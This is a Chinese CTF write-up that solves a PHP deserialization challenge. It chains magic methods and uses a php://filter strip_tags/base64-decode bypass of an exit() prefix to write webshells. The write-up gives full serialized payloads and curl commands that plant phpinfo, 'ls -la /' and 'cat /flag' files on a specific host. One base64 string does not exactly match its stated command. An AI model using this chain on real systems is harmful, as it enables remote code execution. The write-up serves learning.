
#wp #web

【[[WEB]]】扩展题目 - [[扩展题目]]

创建时间：2025-07-06 02:28

### 解题过程

    
- **关键源码**：
    
    ```php
    Class FLAG {
        public $filename;
        public $content;
        public function __call($name, $arguments) {
            if (preg_match('/%|eval|exec|shell|system|passthru|assert|echo|print|`/i', $this->content)) {
                die('feng不喜欢这些字符');
            }
            echo "你该如何过死亡代码呢?";
            file_put_contents($this->filename, '<?php exit();' . $this->content);
        }
    }
    Class welcome {
        public $feng;
        public $you;
        public function __destruct() {
            if (isset($this->you) && $this->you=='Welcome to join CTF web Team') {
                echo "good";
                $this->feng->source;
            }
        }
        public function __invoke() {
            echo $this->feng;
        }
    }
    Class Geek {
        public $tou;
        public function __get($name) {
            $Challenge = $this->tou;
            return $Challenge();
        }
        public function __toString() {
            $this->tou->Getflag();
            return "Just do it";
        }
    }
    unserialize($_POST['data']);
    ```
    

## 二、漏洞原理

1. **魔术方法链**
    
    - `welcome::__destruct()` 在析构时会执行 `$this->feng->source;`
        
    - 把 `feng` 设为 `Geek` 对象可触发 `Geek::__get('source')`，其会把 `tou` 当作可调用执行
        
    - 令 `Geek->tou = [ $flagObj, 'source' ]`，即可触发 `FLAG::__call('source', [])`
        
2. **“死亡代码”阻断 & 绕过思路**
    
    - 目标在写文件时会加上前缀 `<?php exit();`，并且拒绝内容中含有 `system|eval|...` 等关键字符
        
    - 利用 `php://filter` 伪协议，先用 `string.strip_tags` 去掉前缀，再用 `convert.base64-decode` 解码出真正的 PHP 代码
        

## 三、利用流程

### 1. 写入 `phpinfo.php`（验证管道可用）

- **payload 中的 filename**
    
    ```php
    php://filter/write=string.strip_tags|convert.base64-decode/resource=phpinfo.php
    ```
    
- **payload 中的 content**
    
    ```php
    echo -n '<?php phpinfo();?>' | base64
    # => PD9waHAgcGhwaW5mbygpOz8+
    # 加前缀 ">?>"： ?>PD9waHAgcGhwaW5mbygpOz8+
    ```
    
- **完整 curl**
    
    ```sh
    curl -X POST 'http://110.42.47.169:35406/' \
      --data-urlencode 'data=O:7:"welcome":2:{s:4:"feng";O:4:"Geek":1:{s:3:"tou";a:2:{i:0;O:4:"FLAG":2:{s:8:"filename";s:79:"php://filter/write=string.strip_tags|convert.base64-decode/resource=phpinfo.php";s:7:"content";s:26:"?>PD9waHAgcGhwaW5mbygpOz8+";}i:1;s:6:"source";}}s:3:"you";s:28:"Welcome to join CTF web Team";}'
    ```
    
- **效果**：访问 `http://110.42.47.169:35406/phpinfo.php` 出现 PHP 信息页，证明写入管道正常。
    

### 2. 写入 `dir.php`（目录探测）

- **filename**
    
    ```bash
    php://filter/write=string.strip_tags|convert.base64-decode/resource=dir.php
    ```
    
- **content**
    
    ```bash
    echo -n '<?php system("ls -la /");?>' | base64
    # => PD9waHAgc3lzdGVtKCdscyAtbGEgLCAvJyk7Pz4=
    # 加前缀 ">?>"： ?>PD9waHAgc3lzdGVtKCdscyAtbGEgLCAvJyk7Pz4=
    ```
    
- **完整 curl**
    
    ```bash
    curl -X POST 'http://110.42.47.169:35406/' \
      --data-urlencode 'data=O:7:"welcome":2:{s:4:"feng";O:4:"Geek":1:{s:3:"tou";a:2:{i:0;O:4:"FLAG":2:{s:8:"filename";s:75:"php://filter/write=string.strip_tags|convert.base64-decode/resource=dir.php";s:7:"content";s:42:"?>PD9waHAgc3lzdGVtKCdscyAtbGEgLCAvJyk7Pz4=";}i:1;s:6:"source";}}s:3:"you";s:28:"Welcome to join CTF web Team";}'
    ```
    
- **效果**：访问 `http://110.42.47.169:35406/dir.php`，可见 `/` 根目录文件列表。
    

### 3. 写入 `flag.php`（获取 Flag）

- **filename**
    
    ```bash
    php://filter/write=string.strip_tags|convert.base64-decode/resource=flag.php
    ```
    
- **content**
    
    ```bash
    echo -n '<?php system("cat /flag");?>' | base64
    # => PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTs/Pg==
    # 加前缀 ">?>"： ?>PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTs/Pg==
    ```
    
- **完整 curl**
    
    ```bash
    curl -X POST 'http://110.42.47.169:35406/' \
      --data-urlencode 'data=O:7:"welcome":2:{s:4:"feng";O:4:"Geek":1:{s:3:"tou";a:2:{i:0;O:4:"FLAG":2:{s:8:"filename";s:76:"php://filter/write=string.strip_tags|convert.base64-decode/resource=flag.php";s:7:"content";s:42:"?>PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTs/Pg==";}i:1;s:6:"source";}}s:3:"you";s:28:"Welcome to join CTF web Team";}'
    ```
    
- **查看 Flag**：访问
    
    ```
    http://110.42.47.169:35406/flag.php
    ```
    
    即可看到 `/flag` 文件内容。
    

## 四、小结

- **核心**：魔术方法链 `welcome->__destruct` → `Geek->__get` → `FLAG->__call`
    
- **绕过**：利用 `php://filter` 双过滤器剥除死代码并解码执行
    
- **步骤**：写入 `phpinfo.php` 验证 → `dir.php` 探测目录 → `flag.php` 获取 Flag
    
- **成果**：成功读取系统 `/flag`，拿到题目 Flag